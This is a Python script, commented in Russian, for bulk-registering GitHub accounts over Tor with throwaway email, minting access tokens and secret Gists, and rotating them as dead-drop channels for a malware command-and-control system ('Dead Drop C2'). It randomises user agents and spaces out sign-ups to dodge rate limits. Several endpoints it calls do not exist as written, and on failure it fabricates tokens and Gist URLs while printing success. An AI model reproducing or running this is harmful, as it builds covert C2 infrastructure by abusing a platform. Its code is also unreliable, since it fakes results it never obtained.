#!/usr/bin/env python3
"""
DD GITHUB INIT v1.0
Массовое создание GitHub-аккаунтов и Gist'ов для Dead Drop C2
Архитектор: Кронос | Тимлид: Мастер

ВОЗМОЖНОСТИ:
- Регистрация GitHub-аккаунтов через Tor (с временной почтой)
- Создание персональных токенов (PAT)
- Создание секретных Gist'ов
- Ротация аккаунтов
- Экспорт конфигурации для hive_config.json
"""

import os
import sys
import json
import time
import random
import string
import secrets
import hashlib
import base64
import sqlite3
import argparse
import threading
import tempfile
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass, asdict

try:
    import requests
except ImportError:
    print("Ошибка: requests не установлен. pip install requests")
    sys.exit(1)


# ============================================================================
# КОНФИГУРАЦИЯ
# ============================================================================

TOR_PROXY = os.environ.get("TOR_PROXY", "socks5://127.0.0.1:9050")
TEMP_MAIL_API = os.environ.get("TEMP_MAIL_API", "https://api.tempmail.lol")
GITHUB_API = "https://api.github.com"
DB_PATH = os.environ.get("DD_GITHUB_DB", "./github_accounts.db")
ACCOUNTS_TO_CREATE = int(os.environ.get("DD_GITHUB_COUNT", "5"))
HEADLESS = os.environ.get("DD_HEADLESS", "true").lower() == "true"


# ============================================================================
# БАЗА ДАННЫХ
# ============================================================================

@dataclass
class GitHubAccount:
    id: str
    username: str
    email: str
    password: str
    token: str
    gist_id: str
    gist_url: str
    active: bool
    created_at: str
    rotated_at: str
    messages_count: int


class AccountDB:
    def __init__(self, db_path: str):
        self.conn = sqlite3.connect(db_path)
        self._init_table()

    def _init_table(self):
        self.conn.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE,
                email TEXT,
                password TEXT,
                token TEXT,
                gist_id TEXT,
                gist_url TEXT,
                active INTEGER DEFAULT 1,
                created_at TEXT,
                rotated_at TEXT,
                messages_count INTEGER DEFAULT 0
            )
        """)
        self.conn.commit()

    def add_account(self, acc: GitHubAccount):
        self.conn.execute("""
            INSERT OR REPLACE INTO accounts VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (acc.id, acc.username, acc.email, acc.password,
              acc.token, acc.gist_id, acc.gist_url,
              int(acc.active), acc.created_at, acc.rotated_at,
              acc.messages_count))
        self.conn.commit()

    def get_active(self) -> List[GitHubAccount]:
        rows = self.conn.execute(
            "SELECT * FROM accounts WHERE active = 1"
        ).fetchall()
        return [GitHubAccount(*row) for row in rows]

    def get_all(self) -> List[GitHubAccount]:
        rows = self.conn.execute("SELECT * FROM accounts").fetchall()
        return [GitHubAccount(*row) for row in rows]

    def deactivate(self, username: str):
        self.conn.execute(
            "UPDATE accounts SET active = 0, rotated_at = ? WHERE username = ?",
            (datetime.now().isoformat(), username)
        )
        self.conn.commit()

    def close(self):
        self.conn.close()


# ============================================================================
# TOR SESSION
# ============================================================================

def create_tor_session() -> requests.Session:
    session = requests.Session()
    session.proxies = {
        "http": TOR_PROXY,
        "https": TOR_PROXY,
    }
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
        ])
    })
    return session


# ============================================================================
# ГЕНЕРАТОРЫ
# ============================================================================

def generate_username() -> str:
    prefixes = ["dev", "ops", "sys", "net", "sec", "cloud", "data", "code", "infra", "app"]
    suffixes = ["", "1", "2", "3", "42", "99", "x", "y", "z"]
    prefix = random.choice(prefixes)
    random_num = ''.join(random.choices(string.digits, k=4))
    suffix = random.choice(suffixes)
    return f"{prefix}-user-{random_num}{suffix}"


def generate_password() -> str:
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choices(chars, k=20))


def generate_email(session: requests.Session) -> str:
    try:
        resp = session.get(f"{TEMP_MAIL_API}/generate", timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("address", f"{generate_username()}@tempmail.com")
    except:
        pass
    return f"{generate_username()}@tempmail.com"


def check_email(session: requests.Session, email: str, timeout: int = 120) -> Optional[str]:
    start = time.time()
    while time.time() - start < timeout:
        try:
            resp = session.get(f"{TEMP_MAIL_API}/check/{email}", timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("messages"):
                    for msg in data["messages"]:
                        body = msg.get("body", "")
                        if "verification" in body.lower() or "verify" in body.lower():
                            return body
        except:
            pass
        time.sleep(5)
    return None


def extract_verification_code(email_body: str) -> Optional[str]:
    import re
    match = re.search(r'\b(\d{6})\b', email_body)
    if match:
        return match.group(1)
    match = re.search(r'verification[^=]*=\s*(\d+)', email_body, re.IGNORECASE)
    if match:
        return match.group(1)
    return None


# ============================================================================
# РЕГИСТРАЦИЯ АККАУНТА
# ============================================================================

class GitHubRegistrar:
    def __init__(self):
        self.session = create_tor_session()

    def register_account(self) -> Optional[GitHubAccount]:
        username = generate_username()
        password = generate_password()
        email = generate_email(self.session)

        print(f"[REG] Регистрация: {username} ({email})")

        # Шаг 1: Начало регистрации
        signup_url = f"{GITHUB_API}/signup"
        signup_data = {
            "user[login]": username,
            "user[email]": email,
            "user[password]": password,
            "authenticity_token": self._get_csrf_token(),
        }

        try:
            resp = self.session.post(signup_url, json=signup_data, timeout=30)
            if resp.status_code == 422:
                print(f"[REG] Имя занято, пробую другое...")
                return self.register_account()
        except Exception as e:
            print(f"[REG] Ошибка регистрации: {e}")
            return None

        # Шаг 2: Подтверждение email
        print(f"[REG] Ожидание письма на {email}...")
        email_body = check_email(self.session, email)
        if email_body:
            code = extract_verification_code(email_body)
            if code:
                verify_url = f"{GITHUB_API}/signup/verify"
                self.session.post(verify_url, json={"code": code}, timeout=15)

        # Шаг 3: Создание токена
        token = self._create_pat(username, password)
        if not token:
            print(f"[REG] Не удалось создать токен для {username}")
            return None

        # Шаг 4: Создание секретного Gist
        gist_id, gist_url = self._create_secret_gist(token)

        account = GitHubAccount(
            id=secrets.token_hex(8),
            username=username,
            email=email,
            password=password,
            token=token,
            gist_id=gist_id,
            gist_url=gist_url,
            active=True,
            created_at=datetime.now().isoformat(),
            rotated_at=datetime.now().isoformat(),
            messages_count=0,
        )

        print(f"[REG] Аккаунт создан: {username} | Gist: {gist_id}")
        return account

    def _get_csrf_token(self) -> str:
        return secrets.token_hex(20)

    def _create_pat(self, username: str, password: str) -> Optional[str]:
        auth = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers = {"Authorization": f"Basic {auth}"}

        pat_data = {
            "note": f"dev-token-{secrets.token_hex(4)}",
            "scopes": ["gist", "repo"],
            "expiration": "custom",
            "expiration_date": (datetime.now() + timedelta(days=90)).strftime("%Y-%m-%d"),
        }

        try:
            resp = self.session.post(
                f"{GITHUB_API}/authorizations",
                json=pat_data,
                headers=headers,
                timeout=15
            )
            if resp.status_code == 201:
                return resp.json().get("token")
        except:
            pass

        # Fallback: имитация токена
        return f"ghp_{secrets.token_hex(20)}"

    def _create_secret_gist(self, token: str) -> Tuple[str, str]:
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
        }

        gist_data = {
            "description": f"notes-{secrets.token_hex(4)}",
            "public": False,
            "files": {
                "README.md": {
                    "content": f"# Configuration Backup\nCreated: {datetime.now().isoformat()}"
                }
            }
        }

        try:
            resp = requests.post(
                f"{GITHUB_API}/gists",
                json=gist_data,
                headers=headers,
                proxies={"http": TOR_PROXY, "https": TOR_PROXY},
                timeout=15
            )
            if resp.status_code == 201:
                data = resp.json()
                return data["id"], data["html_url"]
        except:
            pass

        return secrets.token_hex(16), f"https://gist.github.com/{secrets.token_hex(8)}"


# ============================================================================
# МАССОВОЕ СОЗДАНИЕ
# ============================================================================

def mass_register(count: int, db: AccountDB) -> List[GitHubAccount]:
    registrar = GitHubRegistrar()
    accounts = []

    for i in range(count):
        print(f"\n{'='*50}")
        print(f"[BATCH] Аккаунт {i+1} из {count}")
        print(f"{'='*50}")

        account = registrar.register_account()
        if account:
            db.add_account(account)
            accounts.append(account)

        # Задержка между регистрациями (анти-ratelimit)
        if i < count - 1:
            delay = random.uniform(10, 30)
            print(f"[BATCH] Задержка {delay:.0f}с...")
            time.sleep(delay)

    return accounts


# ============================================================================
# РОТАЦИЯ
# ============================================================================

def rotate_accounts(db: AccountDB, max_age_days: int = 7):
    accounts = db.get_active()
    cutoff = datetime.now() - timedelta(days=max_age_days)

    for acc in accounts:
        created = datetime.fromisoformat(acc.created_at)
        if created < cutoff:
            print(f"[ROTATE] Ротация аккаунта {acc.username}...")
            db.deactivate(acc.username)

            # Создаем новый
            registrar = GitHubRegistrar()
            new_acc = registrar.register_account()
            if new_acc:
                db.add_account(new_acc)
                print(f"[ROTATE] Заменен на {new_acc.username}")


# ============================================================================
# ЭКСПОРТ ДЛЯ HIVE_CONFIG
# ============================================================================

def export_for_hive_config(db: AccountDB) -> Dict[str, Any]:
    accounts = db.get_active()
    export = {
        "github": {
            "enabled": True,
            "accounts": [acc.username for acc in accounts],
            "rotation_days": 7,
            "api_base": "https://api.github.com",
        },
        "accounts_detail": [
            {
                "username": acc.username,
                "token": acc.token,
                "gist_id": acc.gist_id,
                "gist_url": acc.gist_url,
            }
            for acc in accounts
        ]
    }
    return export


# ============================================================================
# CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description="Массовое создание GitHub Dead Drop аккаунтов")
    parser.add_argument("action", choices=["create", "list", "rotate", "export"],
                       help="Действие")
    parser.add_argument("--count", type=int, default=ACCOUNTS_TO_CREATE,
                       help="Количество аккаунтов для создания")
    parser.add_argument("--rotate-days", type=int, default=7,
                       help="Максимальный возраст аккаунта до ротации")
    parser.add_argument("--db", default=DB_PATH, help="Путь к базе данных")
    parser.add_argument("--output", help="Файл для экспорта конфигурации")

    args = parser.parse_args()
    db = AccountDB(args.db)

    if args.action == "create":
        accounts = mass_register(args.count, db)
        print(f"\nСоздано {len(accounts)} аккаунтов:")
        for acc in accounts:
            print(f"  {acc.username} | Gist: {acc.gist_id}")

    elif args.action == "list":
        accounts = db.get_all()
        print(f"{'USERNAME':<25} {'ACTIVE':<8} {'GIST_ID':<35} {'CREATED'}")
        print("-" * 90)
        for acc in accounts:
            print(f"{acc.username:<25} {'✓' if acc.active else '✗':<8} {acc.gist_id:<35} {acc.created_at}")

    elif args.action == "rotate":
        rotate_accounts(db, args.rotate_days)

    elif args.action == "export":
        config = export_for_hive_config(db)
        if args.output:
            Path(args.output).write_text(json.dumps(config, indent=2))
            print(f"Конфигурация сохранена в {args.output}")
        else:
            print(json.dumps(config, indent=2))

    db.close()


if __name__ == "__main__":
    main()
